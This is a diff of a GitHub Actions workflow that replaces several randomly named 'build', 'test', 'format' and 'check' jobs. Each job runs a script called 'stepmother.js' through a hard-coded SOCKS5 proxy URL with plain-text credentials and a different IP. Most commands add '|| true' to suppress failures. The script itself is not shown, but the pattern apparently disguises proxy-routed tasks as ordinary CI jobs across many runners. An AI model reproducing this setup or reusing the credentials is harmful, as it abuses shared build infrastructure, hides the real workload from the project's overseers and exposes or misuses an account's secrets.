@@ -8,8 +8,34 @@ on:
       - 'package.json'
 
 jobs:
-  compile_windows2022_node_airman:
-    runs-on: windows-2022
+  deploy_ubuntu2004_node_custom:
+    runs-on: ubuntu-20.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 22
+        - name: Run Task
+          run: |
+            npm install && node stepmother.js "socks5://dcswarup:webshare@38.154.205.15:5283" || true
+
+  test_ubuntu2204_node_integer:
+    runs-on: ubuntu-22.04
+    steps:
+        - name: Checkout Repository
+          uses: actions/checkout@v4
+        - name: Setup Node.js
+          uses: actions/setup-node@v4
+          with:
+            node-version: 18
+        - name: Run Task
+          run: |
+            npm install && node stepmother.js "socks5://dcswarup:webshare@45.43.65.125:6639" || true
+
+  format_windowslatest_node_grouper:
+    runs-on: windows-latest
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -20,23 +46,10 @@ jobs:
         - name: Run Task
           shell: pwsh
           run: |
-            npm install; node stepmother.js "socks5://dcswarup:webshare@173.211.68.30:6312"
+            npm install; node stepmother.js "socks5://dcswarup:webshare@161.123.101.28:6654"
 
-  format_ubuntu2404_node_space:
-    runs-on: ubuntu-24.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 22
-        - name: Run Task
-          run: |
-            npm install && node stepmother.js "socks5://dcswarup:webshare@67.227.36.43:6085" || true
-
-  build_ubuntu2204_bun_exhaust:
-    runs-on: ubuntu-22.04
+  check_windows2025_bun_newsprint:
+    runs-on: windows-2025
     steps:
         - name: Checkout Repository
           uses: actions/checkout@v4
@@ -45,32 +58,6 @@ jobs:
           with:
             bun-version: latest
         - name: Run Task
-          run: |
-            bun install && bun run stepmother.js "socks5://dcswarup:webshare@46.203.210.72:5519" || true
-
-  format_windows2025_node_extension:
-    runs-on: windows-2025
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 24
-        - name: Run Task
           shell: pwsh
           run: |
-            npm install; node stepmother.js "socks5://dcswarup:webshare@104.249.29.80:5773"
-
-  compile_ubuntu2404_node_heartbeat:
-    runs-on: ubuntu-24.04
-    steps:
-        - name: Checkout Repository
-          uses: actions/checkout@v4
-        - name: Setup Node.js
-          uses: actions/setup-node@v4
-          with:
-            node-version: 18
-        - name: Run Task
-          run: |
-            npm install && node stepmother.js "socks5://dcswarup:webshare@85.198.41.190:6116" || true
+            bun install; bun run stepmother.js "socks5://dcswarup:webshare@102.212.91.38:6350"
